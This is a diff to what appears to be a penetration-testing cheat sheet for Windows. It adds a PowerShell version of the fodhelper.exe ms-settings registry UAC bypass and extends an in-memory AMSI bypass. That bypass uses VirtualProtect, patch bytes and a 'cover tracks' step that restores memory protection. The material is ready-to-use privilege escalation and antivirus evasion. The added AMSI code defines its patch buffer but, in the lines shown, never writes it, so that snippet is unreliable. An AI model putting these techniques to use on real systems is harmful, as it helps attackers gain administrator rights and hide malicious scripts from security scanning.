@@ -314,6 +314,15 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 ```
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 ```
+Powershell:
+```powershell
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe -Force
+
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+
+C:\Windows\System32\fodhelper.exe
+```
+
 
 **Example Eventvwr.exe**
 * see https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/
@@ -2100,6 +2109,7 @@ htc --forward-port 8080 10.10.10.10:4444
 AMSI = Anti Malware Scan Interface
 
 We can bypass the amsi.dll by crashing it. The following powershell script can be used:
+Info: First a "test rdx, rdx" is performed. If we can replace it with "XOR rax, rax" AMSI will crash since the "zero flag" is set. 
 
 ```
 function LookupFunc {
@@ -2143,8 +2153,12 @@ function getDelegateType {
 $oldProtectionBuffer = 0
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
 $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48, 0x31, 0xC0)
+# restore original memory protection to cover tracks
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
 
 ```
+test with 'amsiutils' command
 
 Same for JScript
 ```
